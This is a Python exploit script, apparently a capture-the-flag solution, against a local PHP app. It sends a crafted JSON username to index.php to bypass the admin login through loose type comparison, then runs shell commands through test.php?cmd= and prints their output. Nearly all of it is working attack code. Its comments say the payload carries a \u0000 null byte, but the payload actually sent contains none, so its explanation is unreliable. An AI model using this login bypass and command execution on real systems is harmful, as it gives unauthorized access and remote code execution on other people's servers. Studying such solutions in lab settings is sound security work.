#!/usr/bin/env python3
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup  # pip install beautifulsoup4

class AdminLoginBypass:
    def __init__(self, base_url: str):
        self.base = base_url.rstrip('/') + '/'
        self.s = requests.Session()

    def bypass_admin(self) -> bool:
        """Gửi JSON username có \u0000 để fail strict === nhưng match case "admin" trong switch."""
        url = urljoin(self.base, 'index.php')
        # Phải là chuỗi JSON với \\u0000 (2 backslash) để tới PHP mới decode thành \0
        payload_str = r'{"username":"true"}'
        r = self.s.post(url, data={'username': payload_str}, allow_redirects=True)
        # Kiểm tra đã lên admin: test.php của admin chạy lệnh (mặc định ls) và KHÔNG hiển thị "hi guest"
        t = self.s.get(urljoin(self.base, 'test.php'))
        return 'hi guest' not in t.text.lower()

    def run_cmd(self, cmd: str) -> str:
        """Chạy lệnh qua test.php?cmd=... (chỉ khi đã là admin)."""
        r = self.s.get(urljoin(self.base, 'test.php'), params={'cmd': cmd})
        # Trích nội dung trong <pre>...</pre> cho gọn
        try:
            soup = BeautifulSoup(r.text, 'html.parser')
            pre = soup.find('pre')
            return pre.get_text('\n') if pre else r.text
        except Exception:
            return r.text

if __name__ == '__main__':
    target = 'http://127.0.0.1:8001/'
    x = AdminLoginBypass(target)

    if x.bypass_admin():
        print('[+] Admin session obtained!')
        # thử chạy lệnh an toàn
        print(x.run_cmd('id'))
        print(x.run_cmd('ls -la'))
    else:
        print('[-] Failed to obtain admin session')
